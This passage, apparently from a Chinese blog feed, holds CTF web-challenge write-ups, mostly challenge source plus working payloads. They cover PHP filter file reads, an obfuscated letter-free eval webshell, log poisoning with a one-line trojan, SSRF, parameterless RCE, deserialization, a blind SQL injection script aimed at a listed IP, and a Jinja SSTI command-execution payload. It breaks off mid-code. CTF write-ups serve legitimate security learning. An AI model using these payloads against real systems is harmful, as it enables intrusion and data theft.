function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>payload：<br>?filter&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221110000722894.png"></p><h3 id="Challenge-rce"><a href="#Challenge-rce" class="headerlink" title="Challenge__rce"></a>Challenge__rce</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hint'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'rce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$rce</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'rce'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">120</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[!@#%^&amp;*:'\-&lt;?>\"\/|`a-zA-Z~\\\\]/"</span><span class="token punctuation">,</span> <span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Are you hack me?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"I want string!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"too long!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题不会啊：</p><p>只能用 <code>$ _ () [] &#123;&#125; , . = + ;</code> 和数字 0-9 以及其它非 A-Z a-iz 的 Unicode 字符</p><p>然后根据题目的 hint <code>灵感来源于 ctfshow 七夕杯的 shellme_revenge</code>, 那题用的是 <code>NAN INF</code> 两个常量, 不过需要 <code>/</code> 运算符参与</p><p>用 chr 来构造 webshell， <code>chr</code> 的字母顺序就是 c h r, 可以通过 <code>Array</code> 中的 a 自增到 c 和 h</p><p>而且最关键的是字母 r 也在 <code>Array</code> 里, 可以直接取, 不需要自增, 这样就省了一大堆代码</p><p>最终 payload 如下</p><pre class="line-numbers language-none"><code class="language-none">$_&#x3D;([].¥)&#123;3&#125;;$_++;$_.&#x3D;++$_;$_++;$_++;$_++; $_++;$_++;$_.&#x3D;([].¥)&#123;2&#125;;$_&#x3D;_.$_(71).$_(69).$_(84);($$_&#123;0&#125;)($$_&#123;1&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>长度为 112 字符</p><p>用到了php7 的性质, 例如 <code>($a)&#123;1&#125;</code> 和 <code>($a)($b)</code>, 然后又通过 <code>++$a</code> 和 <code>$a++</code> 的执行顺序差异进一步缩短长度</p><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="easy-include"><a href="#easy-include" class="headerlink" title="easy_include"></a>easy_include</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//WEB手要懂得搜索</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nginx 日志包含</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现可以包含，我们想到可以在日志中插入php一句话<a href="https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">木马</a>，然后使用蚁剑或者菜刀连接</p><p>使用burp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>，修改referer 写入一句话木马</p><h3 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$port</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$error</span><span class="token punctuation">,</span><span class="token variable">$errstr</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fsockopen 发送原始 tcp 数据包</p><p>手写一个 http 数据包</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;flag.php HTTP&#x2F;1.1Host: 127.0.0.1Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">index.php?host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo%3d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Canyource"><a href="#Canyource" class="headerlink" title="Canyource"></a>Canyource</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'please input code'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个正则是无参数 rce</p><pre class="line-numbers language-none"><code class="language-none">?code&#x3D;readfile(next(array_reverse(scandir(getcwd()))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221110002913454.png"></p><h3 id="easy-unser"><a href="#easy-unser" class="headerlink" title="easy_unser"></a>easy_unser</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">include</span> <span class="token string single-quoted-string">'f14g.php'</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">body</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$want</span><span class="token punctuation">,</span><span class="token variable">$todonothing</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"i can't get you want,But you can tell me before I wake up and change my mind"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$want</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$About_me</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"When the object is created,I will be called"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$want</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">want</span> <span class="token operator">=</span> <span class="token variable">$want</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">want</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">todonothing</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$About_me</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"When the object is unserialized,I will be called"</span><span class="token punctuation">;</span>        <span class="token variable">$but</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"I can CHANGE you"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">want</span> <span class="token operator">=</span> <span class="token variable">$but</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"C1ybaby!"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$About_me</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"I'm the final function,when the object is destroyed,I will be called"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"So,let me see if you can get what you want\n"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">todonothing</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">want</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"鲍勃,别傻愣着!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">want</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"I can CHANGE you"</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"You are not you...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">want</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"f14g.php"</span> <span class="token keyword">OR</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">want</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"You want my heart?No way!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You got it!"</span><span class="token punctuation">;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">want</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">unserializeorder</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$CORE</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR>"</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$About_me</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"When the object is serialized,I will be called"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$About_me</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"When the object is used as a string,I will be called"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">CORE</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">unserializeorder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ywant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ywant</span> <span class="token operator">=</span> @<span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ywant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$ywant</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单反序列化</p><p>用 unserializeorder 可以绕过 <code>is_file</code> 的检测</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">body</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$want</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$want</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">want</span> <span class="token operator">=</span> <span class="token variable">$want</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">unserializeorder</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$CORE</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=f14g.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">body</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">unserializeorder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?ywant&#x3D;O%3A4%3A%22body%22%3A2%3A%7Bs%3A10%3A%22%00body%00want%22%3BO%3A16%3A%22unserializeorder%22%3A1%3A%7Bs%3A4%3A%22CORE%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Df14g.php%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221110003106217.png"></p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221110003803234.png"></p><p>过滤了 and information_schema 空格</p><p>information_schema 可以用 InnoDB 的表代替, 刚好数据库用户是 root, 版本号也满足</p><p>注释也被过滤了, 需要用 or 构造一下</p><p>然后就是利用子查询进行无列名盲注, 因为 InnoDB 的表查不了列名</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://43.143.7.97:28322/index.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#sql = "123'or(if(ascii(substr((select/**/group_concat(database_name)/**/from/**/mysql.innodb_table_stats),&#123;&#125;,1))=&#123;&#125;,1,0))or'1'='11".format(i,s)</span>        <span class="token comment">#sql = "123'or(if(ascii(substr((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='ctftraining'),&#123;&#125;,1))=&#123;&#125;,1,0))or'1'='11".format(i,s)</span>        sql <span class="token operator">=</span> <span class="token string">"123'or(if(ascii(substr((select/**/group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)x),&#123;&#125;,1))=&#123;&#125;,1,0))or'1'='11"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>s<span class="token punctuation">)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span>sql<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'error'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'filtered !!!'</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'handsome'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="ez-SSTI"><a href="#ez-SSTI" class="headerlink" title="ez_SSTI"></a>ez_SSTI</h3><p>简单 ssti</p><pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;][&#39;popen&#39;](&#39;cat flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221110003708862.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStar CTF</title>
      <link href="/2022/09/30/NewStarCTF2022/"/>
      <url>/2022/09/30/NewStarCTF2022/</url>
      
        <content type="html"><![CDATA[<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a><strong>HTTP</strong></h3><p>get传入&#x2F;?name&#x3D;1，提示post传入key，</p><p>右键查看源码，发现key</p><p>post：key&#x3D;ctfisgood</p><p>提示需要admin身份，直接get修改name&#x3D;admin不成功</p><p>burpsuite抓包修改cookie中的user&#x3D;admin</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930162708785.png"></p><h3 id="Head-Header"><a href="#Head-Header" class="headerlink" title="Head?Header!"></a><strong>Head?Header!</strong></h3><p>抓包修改head</p><p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930163518054.png"></p><h3 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a><strong>NotPHP</strong></h3><p>源码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(file_get_contents($_GET[&#39;data&#39;]) &#x3D;&#x3D; &quot;Welcome to CTF&quot;)&#123;    if(md5($_GET[&#39;key1&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;key2&#39;]) &amp;&amp; $_GET[&#39;key1&#39;] !&#x3D;&#x3D; $_GET[&#39;key2&#39;])&#123;        if(!is_numeric($_POST[&#39;num&#39;]) &amp;&amp; intval($_POST[&#39;num&#39;]) &#x3D;&#x3D; 2077)&#123;            echo &quot;Hack Me&quot;;            eval(&quot;#&quot;.$_GET[&#39;cmd&#39;]);        &#125;else&#123;            die(&quot;Number error!&quot;);        &#125;    &#125;else&#123;        die(&quot;Wrong 